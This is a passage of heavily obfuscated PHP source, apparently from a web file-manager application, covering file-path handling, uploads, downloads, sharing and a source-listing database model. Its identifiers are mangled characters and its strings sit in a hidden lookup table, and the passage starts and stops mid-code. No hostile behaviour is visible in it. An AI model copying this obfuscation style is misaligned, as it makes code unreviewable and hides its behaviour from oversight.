$_SERVER[³Ôà×Ó]; $·ş˜¹éœ = $this->infoWithChildren($óÓ±¸¹Ã); return $·ş˜¹éœ[$ûÁäÉûÁ[170]][$ûÁäÉûÁ[681]]; } public function hashMd5($ç¡Íõ‚ğ) { $ñÔêÑ¾ =& $_SERVER[³Ôà×Ó]; $ÒÒĞÑ§è = $this->infoWithChildren($ç¡Íõ‚ğ); return $ÒÒĞÑ§è[$ñÔêÑ¾[170]][$ñÔêÑ¾[556]]; } public function exist($Ì®ÄË¨ô) { $”Ø—¤Úó =& $_SERVER[³Ôà×Ó]; $äÁÙ€ïŞ = $this->parse($Ì®ÄË¨ô); if (!$äÁÙ€ïŞ[$”Ø—¤Úó[87]]) { return $this->isFile($Ì®ÄË¨ô) || $this->isFolder($Ì®ÄË¨ô); } $ÀîÖ«šã = array($”Ø—¤Úó[486] => $äÁÙ€ïŞ[$”Ø—¤Úó[484]], $”Ø—¤Úó[32] => $äÁÙ€ïŞ[$”Ø—¤Úó[87]]); $²¨•û = $this->model->where($ÀîÖ«šã)->find(); return $²¨•û ? !0 : !1; } public function isFile($çĞ²¶Ã—) { $³Ã‘Ô– =& $_SERVER[³Ôà×Ó]; $§íÜ¼ã© = $this->infoSimple($çĞ²¶Ã—); return $§íÜ¼ã© && $§íÜ¼ã©[$³Ã‘Ô–[494]] == $³Ã‘Ô–[228] ? !0 : !1; } public function isFolder($Ë™Å÷—´) { $ªÚÂó­ =& $_SERVER[³Ôà×Ó]; $€úàÒ° = $this->infoSimple($Ë™Å÷—´); return $€úàÒ° && $€úàÒ°[$ªÚÂó­[494]] == $ªÚÂó­[91] ? !0 : !1; } public function listPath($îãÏâú, $­ÄÆÚ® = false) { $Ë‚â¤ =& $_SERVER[³Ôà×Ó]; if ($îãÏâú == $Ë‚â¤[12]) { return !1; } $ á¢ÈÔ¢ = array($Ë‚â¤[486] => $îãÏâú); if ($­ÄÆÚ®) { return $this->model->listSource($ á¢ÈÔ¢, -1); } return $this->model->listSource($ á¢ÈÔ¢); } public function has($ò¹è–¤É, $œ«¹Ì½ = false, $Ë·ĞƒÓ = null) { $Ñ¡˜™Ä =& $_SERVER[³Ôà×Ó]; $òî¸·ä¾ = $this->infoWithChildren($ò¹è–¤É); if ($œ«¹Ì½) { return array($Ñ¡˜™Ä[240] => $òî¸·ä¾[$Ñ¡˜™Ä[240]], $Ñ¡˜™Ä[239] => $òî¸·ä¾[$Ñ¡˜™Ä[239]]); } return $Ë·ĞƒÓ ? $òî¸·ä¾[$Ñ¡˜™Ä[240]] : $òî¸·ä¾[$Ñ¡˜™Ä[239]]; } public function listAll($üŸ¤ß”Å) { $ïñÒ¼½ô = IO::info($this->pathParse[$_SERVER[³Ôà×Ó][87]]); if (!$ïñÒ¼½ô) { return array(); } return $this->model->listAll($üŸ¤ß”Å); } public function getContent($£ Àßõ¬) { return $this->model->getContent($£ Àßõ¬); } public function setContent($íÄ¿Èá, $ÕÙĞí”Ù = '') { return $this->model->setContent($íÄ¿Èá, $ÕÙĞí”Ù); } public function fileSubstr($ôÏ¤ĞÂ«, $ÚĞ†”Äª, $Ùœˆà) { return $this->model->fileSubstr($ôÏ¤ĞÂ«, $ÚĞ†”Äª, $Ùœˆà); } public function download($€¸³Â¯, $º¸¹‰ó¶ = '') { $üòŸ×ÛØ = get_path_father($º¸¹‰ó¶); $Çï×ÚÙ» = get_path_this($º¸¹‰ó¶); $ƒüåÀ¶ = $this->model->fileInfoGet($€¸³Â¯); $â†—ô£° = IO::copy($ƒüåÀ¶[$_SERVER[³Ôà×Ó][87]], $üòŸ×ÛØ, !1, $Çï×ÚÙ»); return $â†—ô£°; } public function setModifyTime($õ£Í¼ëî, $Üşßğî‰ = '') { $Á¹Ìæ¿Ç =& $_SERVER[³Ôà×Ó]; if (!$õ£Í¼ëî) { return; } $this->model->where(array($Á¹Ìæ¿Ç[500] => $õ£Í¼ëî))->save(array($Á¹Ìæ¿Ç[88] => $Üşßğî‰)); } public function upload($‡éÁ­í¢, $æ‰Ô‰¾†, $²ûŒŒ­Ÿ = false, $¶–„÷ÜÔ = REPEAT_REPLACE) { $æëÓÅÅ =& $_SERVER[³Ôà×Ó]; $¥ß¨Ù“ = $this->parse($‡éÁ­í¢); $öà¼ğ’´ = $this->model->addFile($¥ß¨Ù“[$æëÓÅÅ[484]], $æ‰Ô‰¾†, $¥ß¨Ù“[$æëÓÅÅ[87]], $²ûŒŒ­Ÿ, $¶–„÷ÜÔ); return $this->getPathOuter($öà¼ğ’´); } public function uploadFileByID($²¶”ÈËı, $£ßªÌ , $âëûˆûö) { $‰ÁÕùÍ =& $_SERVER[³Ôà×Ó]; $äÆÀ®å¢ = $this->parse($²¶”ÈËı); $£ç¼Çú„ = $this->model->addFileByFileID($äÆÀ®å¢[$‰ÁÕùÍ[484]], $£ßªÌ , $äÆÀ®å¢[$‰ÁÕùÍ[87]], $âëûˆûö); return $this->getPathOuter($£ç¼Çú„); } public function addFileByRemote($ŞÇç¹­Å, $È’‚š ş, $·è´ëï½ = array(), $ØÄ“Øáİ = '', $¢¢¡¨úÄ) { $òØ¨ÍùÌ =& $_SERVER[³Ôà×Ó]; $ñ¢«ş‘å = $this->parse($ŞÇç¹­Å); $ØÄ“Øáİ = empty($ØÄ“Øáİ) ? $ñ¢«ş‘å[$òØ¨ÍùÌ[87]] : $ØÄ“Øáİ; $º£¾Õ¿ = $this->model->addFileByRemote($ñ¢«ş‘å[$òØ¨ÍùÌ[484]], $È’‚š ş, $ØÄ“Øáİ, $·è´ëï½, $¢¢¡¨úÄ); return $this->getPathOuter($º£¾Õ¿); } public function uploadLink($Ô¶Åµ›Š, $££Ú‘Áì = 0) { $÷…êË¨² =& $_SERVER[³Ôà×Ó]; $”àÆ§¬ = $this->parse($Ô¶Åµ›Š); $¯¢ÑúŒ¢ = _get($GLOBALS[$÷…êË¨²[7]], $÷…êË¨²[1416]); $œøÏ¹¿ø = _get($GLOBALS[$÷…êË¨²[7]], $÷…êË¨²[1417]); $Ô¶Åµ›Š = Model($÷…êË¨²[683])->createFileName($”àÆ§¬[$÷…êË¨²[87]], $¯¢ÑúŒ¢, $œøÏ¹¿ø); return IO::uploadLink($Ô¶Åµ›Š, $££Ú‘Áì); } public function fileNameAuto($Ü§¤¯ñ¸, $Ñ²ÖÛ˜Å, $±µÆ×± = REPEAT_REPLACE, $£±°ßÚ© = false) { return $this->model->fileNameAuto($Ü§¤¯ñ¸, $Ñ²ÖÛ˜Å, $±µÆ×±, $£±°ßÚ©); } public function fileNameExist($¨ğíÉÑò, $§ßÚİÛ†) { return $this->model->fileNameExist($¨ğíÉÑò, $§ßÚİÛ†); } protected function _fileOut($ßûÛİ‚Õ, $‰Ÿ¿›™Ã = false, $£ÕÁŸö¥ = false, $åûşœ‰ñ = '', $–âå“İ¹ = false) { $·Öº°æÈ =& $_SERVER[³Ôà×Ó]; $Õ¸İ±ÙÈ = $this->model->sourceInfo($ßûÛİ‚Õ); if ($Õ¸İ±ÙÈ[$·Öº°æÈ[494]] == $·Öº°æÈ[91]) { header($·Öº°æÈ[1418]); die; } $‰êãÌğá = $this->model->fileInfoGet($ßûÛİ‚Õ); $åûşœ‰ñ = $‰êãÌğá[$·Öº°æÈ[556]] ? $‰êãÌğá[$·Öº°æÈ[556]] : $åûşœ‰ñ; $ëƒëÀîõ = isset($GLOBALS[$·Öº°æÈ[182]]) && is_array($GLOBALS[$·Öº°æÈ[182]]) ? $GLOBALS[$·Öº°æÈ[182]][$·Öº°æÈ[32]] : $Õ¸İ±ÙÈ[$·Öº°æÈ[32]]; if ($–âå“İ¹) { return IO::fileOutServer($‰êãÌğá[$·Öº°æÈ[87]], $‰Ÿ¿›™Ã, $ëƒëÀîõ, $åûşœ‰ñ); } IO::fileOut($‰êãÌğá[$·Öº°æÈ[87]], $‰Ÿ¿›™Ã, $ëƒëÀîõ, $åûşœ‰ñ); } public function fileOut($î‚ù©¶è, $…°åÊ™ = false, $á¶ŞÈ‡İ = false, $æ‰ëáÀÀ = '') { $this->_fileOut($î‚ù©¶è, $…°åÊ™, $á¶ŞÈ‡İ, $æ‰ëáÀÀ); } public function fileOutServer($È¶Ø¥²÷, $ÍòÑˆŒİ = false, $ÖÊÑÜÉ„ = false, $«ê¼¯àù = '') { $this->_fileOut($È¶Ø¥²÷, $ÍòÑˆŒİ, $ÖÊÑÜÉ„, $«ê¼¯àù, !0); } protected function _fileOutImage($¨¶ºê³ø, $µ¥ßöÖŸ = 250) { $—ÌÕ¾è =& $_SERVER[³Ôà×Ó]; $¼ÇÜÒú• = $this->model->pathInfo($¨¶ºê³ø); if ($¼ÇÜÒú•[$—ÌÕ¾è[494]] == $—ÌÕ¾è[91]) { show_json($—ÌÕ¾è[1419] . $¨¶ºê³ø, !1); } $€‰Éúğ‰ = $this->model->fileInfoGet($¨¶ºê³ø); $¼ÇÜÒú•[$—ÌÕ¾è[183]] = $€‰Éúğ‰[$—ÌÕ¾è[87]]; $GLOBALS[$—ÌÕ¾è[182]] = $¼ÇÜÒú•; IO::fileOutImage($€‰Éúğ‰[$—ÌÕ¾è[87]], $µ¥ßöÖŸ); } public function fileOutImage($†²ƒ‘ğ¤, $·¸éù®¤ = 250) { $this->_fileOutImage($†²ƒ‘ğ¤, $·¸éù®¤); } public function fileOutImageServer($¸ÒµæÒğ, $—Ó‰èôÜ = 250) { $this->_fileOutImage($¸ÒµæÒğ, $—Ó‰èôÜ); } public function link($Áİ’‹Œç, $õ¸â¦ığ = '') { $ÈÛ˜©÷Ö = $this->model->fileInfoGet($Áİ’‹Œç); return IO::link($ÈÛ˜©÷Ö[$_SERVER[³Ôà×Ó][87]], $õ¸â¦ığ); } protected function parse($öª«Ú—) { $ƒ”°Öø§ =& $_SERVER[³Ôà×Ó]; if (strstr($öª«Ú—, $ƒ”°Öø§[8]) === !1) { return array($ƒ”°Öø§[502] => intval($öª«Ú—), $ƒ”°Öø§[87] => $ƒ”°Öø§[12], $ƒ”°Öø§[1415] => array()); } $‡£ÃÈÜ = explode($ƒ”°Öø§[8], trim($öª«Ú—, $ƒ”°Öø§[8])); if (count($‡£ÃÈÜ) < 2) { show_tips(clear_html($öª«Ú—) . $ƒ”°Öø§[1420]); } return array($ƒ”°Öø§[502] => intval($‡£ÃÈÜ[0]), $ƒ”°Öø§[87] => $‡£ÃÈÜ[1], $ƒ”°Öø§[1415] => array_slice($‡£ÃÈÜ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($’‰ËÀËó) { $this->pathParse = $’‰ËÀËó; $this->model = Model($_SERVER[³Ôà×Ó][1414]); } public function getPathOuter($¤ãÀæ™½) { $¸÷ÏæÊû =& $_SERVER[³Ôà×Ó]; if (!$¤ãÀæ™½) { return $¤ãÀæ™½; } $Ç’Ä÷ş = $this->parse($¤ãÀæ™½); return trim(KodIO::makeShare($this->pathParse[$¸÷ÏæÊû[484]], $Ç’Ä÷ş[$¸÷ÏæÊû[484]]), $¸÷ÏæÊû[8]); } protected function infoParse($”Ç´¤Şã, $…ûìÎÁ¼ = false, $çÖòŒ = false) { $ß«˜¬æ‘ =& $_SERVER[³Ôà×Ó]; $Ğ˜®É… = $this->pathParse[$ß«˜¬æ‘[484]]; $Á·©ÜÕ¼ = trim($this->pathParse[$ß«˜¬æ‘[1247]], $ß«˜¬æ‘[8]); return Action($ß«˜¬æ‘[1421])->sharePathInfo($Ğ˜®É…, $Á·©ÜÕ¼, $…ûìÎÁ¼); } public function infoFull($Øì¸³¸) { $³çÚÅê =& $_SERVER[³Ôà×Ó]; $’ØÍŸ¶ = explode($³çÚÅê[8], trim($Øì¸³¸, $³çÚÅê[8])); if (count($’ØÍŸ¶) > 1) { $£·ÆË¾ = implode($³çÚÅê[8], array_splice($’ØÍŸ¶, 1)); $€€Š¶Ÿğ = $this->model->pathInfoByPath($’ØÍŸ¶[0], $£·ÆË¾); if (!$€€Š¶Ÿğ) { return !1; } $this->pathParse[$³çÚÅê[1247]] = $€€Š¶Ÿğ[$³çÚÅê[193]]; } return $this->infoParse($Øì¸³¸); } public function listAll($ã£–…ë) { $×Îû´ªÛ =& $_SERVER[³Ôà×Ó]; $ã‹¾£ğÅ = IO::info($this->pathParse[$×Îû´ªÛ[87]]); if (!$ã‹¾£ğÅ) { return array(); } $Ÿ‹ğ‘°ø = $this->model->listAll($ã£–…ë); $¾Ääß£Î = Model($×Îû´ªÛ[673])->getInfo($ã‹¾£ğÅ[$×Îû´ªÛ[674]]); foreach ($Ÿ‹ğ‘°ø as &$é¤•Ü½—) { check_abort(); $é¤•Ü½—[$×Îû´ªÛ[90]] = Action($×Îû´ªÛ[1421])->_shareItemeParse($é¤•Ü½—[$×Îû´ªÛ[90]], $¾Ääß£Î); } unset($é¤•Ü½—); return $Ÿ‹ğ‘°ø; } } goto e©°¤Û¬; Eµ¾Ÿ‘² ¤: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\x63\145"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\x6d\x65" => "\x69\157\x5f\x73\x6f\165\x72\143\145\137\x6d\x65\x74\141", "\155\145\164\141\106\151\145\154\x64" => "\163\x6f\x75\162\x63\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\x69\146\x79\x54\151\155\x65", "\164\x69\155\145", "\x69\156\163\145\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\143\x72\x65\x61\x74\x65\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\x73\x65\x72\x74", "\146\165\156\143\x74\x69\x6f\x6e"), array("\166\151\145\167\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\165\x6e\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Š—¾•„Š) { return $this->listSource(array($_SERVER[³Ôà×Ó][486] => $Š—¾•„Š)); } public function typeName($ÔÙ­ÛÛ”) { static $ÌÇĞëÃï = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\x72\157\165\160"); return $ÌÇĞëÃï[$ÔÙ­ÛÛ” . $_SERVER[³Ôà×Ó][12]]; } public function sourceListInfo($‚şÁÁ—Ş, $ÒëüØøÖ = false) { $ü¼áş·² =& $_SERVER[³Ôà×Ó]; $‚şÁÁ—Ş = $‚şÁÁ—Ş ? $‚şÁÁ—Ş : array(); $‚şÁÁ—Ş = array_filter(array_unique($‚şÁÁ—Ş)); if (!$‚şÁÁ—Ş) { return array(); } $ø¦å±°Ï = $this->where(array($ü¼áş·²[193] => array($ü¼áş·²[7], $‚şÁÁ—Ş)))->select(); $this->_listDataApply($ø¦å±°Ï, $ÒëüØøÖ); return array_to_keyvalue($ø¦å±°Ï, $ü¼áş·²[193]); } public function pathInfoFilter(&$‹§àà¾) { $‰†ÎîÌò =& $_SERVER[³Ôà×Ó]; static $…³ÉÀï¡ = false; static $Ë¾Ì¢Ÿ° = false; static $ÜÛ“ı£À = false; if (!$…³ÉÀï¡) { $™²±µ–å = $‰†ÎîÌò[487]; $™²±µ–å .= $‰†ÎîÌò[488]; $™²±µ–å .= $‰†ÎîÌò[489]; $Ï‘¨Üò¬ = $‰†ÎîÌò[490]; $ÆÍ¾…¾± = explode($‰†ÎîÌò[50], $Ï‘¨Üò¬); $…³ÉÀï¡ = explode($‰†ÎîÌò[50], $™²±µ–å); $Ë¾Ì¢Ÿ° = array(); foreach ($…³ÉÀï¡ as $Úé¸ÄşÑ) { if (in_array($Úé¸ÄşÑ, $ÆÍ¾…¾±)) { continue; } $Ë¾Ì¢Ÿ°[] = $Úé¸ÄşÑ; } $ÜÛ“ı£À = explode($‰†ÎîÌò[50], $‰†ÎîÌò[491]); } foreach ($ÜÛ“ı£À as $´‹ÜÜªÒ) { if (isset($‹§àà¾[$´‹ÜÜªÒ])) { $‹§àà¾[$´‹ÜÜªÒ] = intval($‹§àà¾[$´‹ÜÜªÒ]); } } $‹§àà¾[$‰†ÎîÌò[87]] = $‰†ÎîÌò[492] . $‹§àà¾[$‰†ÎîÌò[193]] . $‰†ÎîÌò[493]; $‹§àà¾[$‰†ÎîÌò[33]] = $‹§àà¾[$‰†ÎîÌò[494]] == 1 ? $‰†ÎîÌò[78] : $‰†ÎîÌò[230]; $‹§àà¾[$‰†ÎîÌò[190]] = $this->typeName($‹§àà¾[$‰†ÎîÌò[190]]); if ($‹§àà¾[$‰†ÎîÌò[494]] != 1) { $‹§àà¾[$‰†ÎîÌò[169]] = $‹§àà¾[$‰†ÎîÌò[495]]; unset($‹§àà¾[$‰†ÎîÌò[495]]); } $­¨‰¦Ğ = $…³ÉÀï¡; if (isset($‹§àà¾[$‰†ÎîÌò[496]]) && $‹§àà¾[$‰†ÎîÌò[496]][$‰†ÎîÌò[497]] == -1) { $­¨‰¦Ğ = $Ë¾Ì¢Ÿ°; } $‹§àà¾ = array_field_key($‹§àà¾, $­¨‰¦Ğ); return $‹§àà¾; } public function listUserFav() { $¸º¥Õ¼ =& $_SERVER[³Ôà×Ó]; $’Ç€œ¢² = Model($¸º¥Õ¼[498])->listData(); $ËÊ¿ İâ = array_filter_by_field($’Ç€œ¢², $¸º¥Õ¼[33], $¸º¥Õ¼[499]); $ËÊ¿ İâ = array_to_keyvalue($ËÊ¿ İâ, $¸º¥Õ¼[12], $¸º¥Õ¼[87]); if ($ËÊ¿ İâ) { $°Õòİ“è = $this->listSource(array($¸º¥Õ¼[500] => array($¸º¥Õ¼[501], $ËÊ¿ İâ))); } $°Õòİ“è = array_to_keyvalue($°Õòİ“è[$¸º¥Õ¼[454]], $¸º¥Õ¼[193]); foreach ($’Ç€œ¢² as &$ÏŠÜ»¿î) { $ÏŠÜ»¿î = array($¸º¥Õ¼[502] => $ÏŠÜ»¿î[$¸º¥Õ¼[484]], $¸º¥Õ¼[503] => $ÏŠÜ»¿î[$¸º¥Õ¼[32]], $¸º¥Õ¼[504] => $ÏŠÜ»¿î[$¸º¥Õ¼[87]], $¸º¥Õ¼[505] => $ÏŠÜ»¿î[$¸º¥Õ¼[33]], $¸º¥Õ¼[506] => $ÏŠÜ»¿î[$¸º¥Õ¼[231]], $¸º¥Õ¼[507] => $ÏŠÜ»¿î[$¸º¥Õ¼[88]]); if ($ÏŠÜ»¿î[$¸º¥Õ¼[33]] == $¸º¥Õ¼[499] && $°Õòİ“è[$ÏŠÜ»¿î[$¸º¥Õ¼[87]]]) { $ÏŠÜ»¿î[$¸º¥Õ¼[90]] = $°Õòİ“è[$ÏŠÜ»¿î[$¸º¥Õ¼[87]]]; } } unset($ÏŠÜ»¿î); return $’Ç€œ¢²; } public function listUserTag($ÇÉ£¡¼Ï) { $ƒæÅÃÜ =& $_SERVER[³Ôà×Ó]; if ($ÇÉ£¡¼Ï && !is_array($ÇÉ£¡¼Ï)) { $ÇÉ£¡¼Ï = array($ÇÉ£¡¼Ï); } $âøÙÛ¦ª = Model($ƒæÅÃÜ[508])->listData(); $—Ùµ«Ù = array(); $ß©ï§Ì¹ = array(); foreach ($âøÙÛ¦ª as $Ü÷ìğİş) { $ïõ—§® = $Ü÷ìğİş[$ƒæÅÃÜ[87]]; if (!$ïõ—§®) { continue; } if (!isset($ß©ï§Ì¹[$ïõ—§®])) { $ß©ï§Ì¹[$ïõ—§®] = array(); } $ß©ï§Ì¹[$ïõ—§®][] = $Ü÷ìğİş[$ƒæÅÃÜ[509]]; $—Ùµ«Ù[$Ü÷ìğİş[$ƒæÅÃÜ[87]]] = $Ü÷ìğİş; } $İıº¢“¹ = array(); $°©ù¾ = array(); $Ÿ‡‡¹áù = array(); foreach ($ß©ï§Ì¹ as $±ãâÉÕı => $ü°Ø©è‹) { $Æø©‰¸› = !0; if (!$ÇÉ£¡¼Ï) { $İıº¢“¹[] = $±ãâÉÕı; continue; } foreach ($ÇÉ£¡¼Ï as $ùôùÀ²œ) { if (!in_array($ùôùÀ²œ, $ü°Ø©è‹)) { $Æø©‰¸› = !1; break; } } if (!$Æø©‰¸›) { continue; } if (!is_numeric($±ãâÉÕı)) { $Ì‘Â˜ØŞ = $—Ùµ«Ù[$±ãâÉÕı]; $šÆäâ¯Ï = array($ƒæÅÃÜ[32] => $Ì‘Â˜ØŞ[$ƒæÅÃÜ[32]], $ƒæÅÃÜ[87] => $Ì‘Â˜ØŞ[$ƒæÅÃÜ[87]], $ƒæÅÃÜ[33] => $Ì‘Â˜ØŞ[$ƒæÅÃÜ[33]], $ƒæÅÃÜ[90] => array($ƒæÅÃÜ[510] => 1), $ƒæÅÃÜ[232] => !0); if ($Ì‘Â˜ØŞ[$ƒæÅÃÜ[33]] == $ƒæÅÃÜ[230]) { $Ÿ‡‡¹áù[] = $šÆäâ¯Ï; } if ($Ì‘Â˜ØŞ[$ƒæÅÃÜ[33]] == $ƒæÅÃÜ[78]) { $°©ù¾[] = $šÆäâ¯Ï; } continue; } $İıº¢“¹[] = $±ãâÉÕı; } if ($İıº¢“¹) { $ã•çïÊ = $this->listSource(array($ƒæÅÃÜ[500] => array($ƒæÅÃÜ[501], $İıº¢“¹))); } $ã•çïÊ = $ã•çïÊ ? $ã•çïÊ : array($ƒæÅÃÜ[85] => array(), $ƒæÅÃÜ[86] => array()); $ã•çïÊ[$ƒæÅÃÜ[85]] = array_merge($ã•çïÊ[$ƒæÅÃÜ[85]], $°©ù¾); $ã•çïÊ[$ƒæÅÃÜ[86]] = array_merge($ã•çïÊ[$ƒæÅÃÜ[86]], $Ÿ‡‡¹áù); if (isset($ã•çïÊ[$ƒæÅÃÜ[451]]) && count($İıº¢“¹) == $ã•çïÊ[$ƒæÅÃÜ[451]][$ƒæÅÃÜ[452]]) { return $ã•çïÊ; } $„œŒğ¥ä = array(); $ åæ­ãÙ = array_to_keyvalue($ã•çïÊ[$ƒæÅÃÜ[85]], $ƒæÅÃÜ[12], $ƒæÅÃÜ[193]); $ÉÂù¨Ùú = array_to_keyvalue($ã•çïÊ[$ƒæÅÃÜ[86]], $ƒæÅÃÜ[12], $ƒæÅÃÜ[193]); $×êÊƒš˜ = array_merge($ÉÂù¨Ùú, $ åæ­ãÙ); foreach ($İıº¢“¹ as $ïõ—§®) { if (!in_array($ïõ—§®, $×êÊƒš˜)) { $„œŒğ¥ä[] = $ïõ—§®; } } if ($„œŒğ¥ä) { Model($ƒæÅÃÜ[511])->removeBySource($„œŒğ¥ä); } return $ã•çïÊ; } public function listUserRecycle() { $ÔĞ¬¢¦‰ =& $_SERVER[³Ôà×Ó]; $ª—¤µˆı = Model($ÔĞ¬¢¦‰[512])->listData(); if (!$ª—¤µˆı) { return array(); } $•ÇÛÍ­ = array($ÔĞ¬¢¦‰[500] => array($ÔĞ¬¢¦‰[501], $ª—¤µˆı), $ÔĞ¬¢¦‰[513] => 1); return $this->listSource($•ÇÛÍ­); } public function listSource($ğáÙŸ«Ò, $Üç‡¡Õİ = 3000, $‚å ÑæŸ = false) { $Ë€¢ü†Ì =& $_SERVER[³Ôà×Ó]; if (!isset($ğáÙŸ«Ò[$Ë€¢ü†Ì[514]])) { $ğáÙŸ«Ò[$Ë€¢ü†Ì[514]] = 0; } if (isset($ğáÙŸ«Ò[$Ë€¢ü†Ì[192]]) && $ğáÙŸ«Ò[$Ë€¢ü†Ì[192]] == $Ë€¢ü†Ì[228]) { $ğáÙŸ«Ò[$Ë€¢ü†Ì[495]] = array($Ë€¢ü†Ì[407], $Ë€¢ü†Ì[515]); } $¨Á¼ÅÜÀ = $Ë€¢ü†Ì[516]; $²¬ùˆ ¹ = $this->field($¨Á¼ÅÜÀ)->_makeOrder()->where($ğáÙŸ«Ò)->selectPage($Üç‡¡Õİ); $this->_listPageCheck($²¬ùˆ ¹, $¨Á¼ÅÜÀ, $ğáÙŸ«Ò); $this->_listDataApply($²¬ùˆ ¹[$Ë€¢ü†Ì[454]], $‚å ÑæŸ); $this->_listMake($²¬ùˆ ¹); return $²¬ùˆ ¹; } private function _listPageCheck(&$“ÄçÙå‹, $²æ¡é·ı, $Á›©‚¦) { $€·èÑ‹Ã =& $_SERVER[³Ôà×Ó]; if (!is_array($“ÄçÙå‹[$€·èÑ‹Ã[451]])) { return; } $ÛœÀšãœ = $“ÄçÙå‹[$€·èÑ‹Ã[451]]; if ($ÛœÀšãœ[$€·èÑ‹Ã[453]] <= 1) { return; } if ($ÛœÀšãœ[$€·èÑ‹Ã[452]] >= 100000) { return; } if (Model($€·èÑ‹Ã[517])->get($€·èÑ‹Ã[518]) != $€·èÑ‹Ã[519]) { return; } $²æ¡é·ı = str_replace(array($€·èÑ‹Ã[53], $€·èÑ‹Ã[418], $€·èÑ‹Ã[262]), $€·èÑ‹Ã[12], $²æ¡é·ı); $²æ¡é·ı = $€·èÑ‹Ã[520] . str_replace($€·èÑ‹Ã[50], $€·èÑ‹Ã[521], $²æ¡é·ı) . $€·èÑ‹Ã[522]; $Ñğçã—Æ = $€·èÑ‹Ã[523]; $Ñğçã—Æ = $Ñğçã—Æ . $€·èÑ‹Ã[524]; $€ëÓ­¸ = $ÛœÀšãœ[$€·èÑ‹Ã[448]] * ($ÛœÀšãœ[$€·èÑ‹Ã[429]] - 1) . $€·èÑ‹Ã[50] . $ÛœÀšãœ[$€·èÑ‹Ã[448]]; $ …á¥—ó = $this->_makeOrder(!0); $¼ÒŠÊÍ = $€·èÑ‹Ã[520] . str_replace($€·èÑ‹Ã[50], $€·èÑ‹Ã[521], $ …á¥—ó[0]); if (strpos($¼ÒŠÊÍ, $€·èÑ‹Ã[525])) { $¼ÒŠÊÍ = str_replace($€·èÑ‹Ã[525], $€·èÑ‹Ã[526], $¼ÒŠÊÍ); } else { $¼ÒŠÊÍ .= $€·èÑ‹Ã[527] . $ …á¥—ó[1]; } $ÚèæòøÓ = array(); foreach ($Á›©‚¦ as $ÍìÄò–Ş => $’èï­¢´) { $ÚèæòøÓ[$€·èÑ‹Ã[520] . $ÍìÄò–Ş] = $’èï­¢´; } $this->alias($€·èÑ‹Ã[528])->field($²æ¡é·ı)->limit($€ëÓ­¸)->order($¼ÒŠÊÍ); $›ğù·ª— = $this->join($Ñğçã—Æ)->where($ÚèæòøÓ)->select(); if ($›ğù·ª—) { $“ÄçÙå‹[$€·èÑ‹Ã[454]] = $›ğù·ª—; } } protected function _makeOrder($ëÒŠÅ³ü = false) { $é¾·•…ã =& $_SERVER[³Ôà×Ó]; $ÅÖ¿Ó‹ = Model($é¾·•…ã[529])->get($é¾·•…ã[530]); $Â½ïà · = Model($é¾·•…ã[529])->get($é¾·•…ã[531]); $İ¥ã¡¿µ = array($é¾·•…ã[532] => $é¾·•…ã[533], $é¾·•…ã[534] => $é¾·•…ã[535]); $ûÈùï = array($é¾·•…ã[32] => $é¾·•…ã[32], $é¾·•…ã[79] => $é¾·•…ã[79], $é¾·•…ã[169] => $é¾·•…ã[495], $é¾·•…ã[536] => $é¾·•…ã[536], $é¾·•…ã[537] => $é¾·•…ã[538], $é¾·•…ã[231] => $é¾·•…ã[231], $é¾·•…ã[88] => $é¾·•…ã[88]); $ˆÍ®ŸÁ® = Input::get($é¾·•…ã[539], $é¾·•…ã[7], $ÅÖ¿Ó‹, array_keys($ûÈùï)); $¾½æõ¬é = Input::get($é¾·•…ã[540], $é¾·•…ã[7], $Â½ïà ·, array_keys($İ¥ã¡¿µ)); if (!in_array($ˆÍ®ŸÁ®, array_keys($ûÈùï))) { $ˆÍ®ŸÁ® = $é¾·•…ã[32]; } if (!in_array($¾½æõ¬é, array_keys($İ¥ã¡¿µ))) { $ˆÍ®ŸÁ® = $é¾·•…ã[532]; } if ($ˆÍ®ŸÁ® == $é¾·•…ã[32]) { } $ĞßÌ­ë = $é¾·•…ã[541] . $ûÈùï[$ˆÍ®ŸÁ®] . $é¾·•…ã[53] . $İ¥ã¡¿µ[$¾½æõ¬é]; $ĞßÌ­ë = rtrim(trim($ĞßÌ­ë), $é¾·•…ã[50]); if ($ëÒŠÅ³ü) { return array($ĞßÌ­ë, $İ¥ã¡¿µ[$¾½æõ¬é]); } return $this->order($ĞßÌ­ë); } protected function _listDataApplyItem($îËå¬òó, $Ì‚”ÕŞ’ = false) { $ŠÑé•‘‡ = array($îËå¬òó); $this->_listDataApply($ŠÑé•‘‡, $Ì‚”ÕŞ’); return $ŠÑé•‘‡[0]; } protected function _listDataApply(&$ÕÉıÖ§, $Íã‚ø³ = false) { $õü‹–¯ =& $_SERVER[³Ôà×Ó]; if (!$ÕÉıÖ§) { $ÕÉıÖ§ = array(); return; } $—×ã»× = array_to_keyvalue($ÕÉıÖ§, $õü‹–¯[12], $õü‹–¯[193]); $—×ã»× = array_unique($—×ã»×); $this->_listSourceCache($ÕÉıÖ§); if (!$Íã‚ø³) { $this->_listAppendMeta($ÕÉıÖ§, $—×ã»×); $this->_listAppendFileMeta($ÕÉıÖ§, $—×ã»×); $this->_listAppendChildren($ÕÉıÖ§, $—×ã»×); } $this->_listAppendPath($ÕÉıÖ§); $this->_listAppendAuth($ÕÉıÖ§); $this->_listAppendSourceInfo($ÕÉıÖ§, $—×ã»×); $this->_listAppendUser($ÕÉıÖ§); $this->_listFilterInfo($ÕÉıÖ§, $Íã‚ø³); $this->_listAppendAuthSecret($ÕÉıÖ§); } protected function _listSourceCache($êÒíµ•º) { $œ¬åÇ¬³ =& $_SERVER[³Ôà×Ó]; foreach ($êÒíµ•º as $Š€’¶¡Ä) { self::$cacheSourceInfo[$œ¬åÇ¬³[542] . $Š€’¶¡Ä[$œ¬åÇ¬³[193]]] = $Š€’¶¡Ä; } } protected function 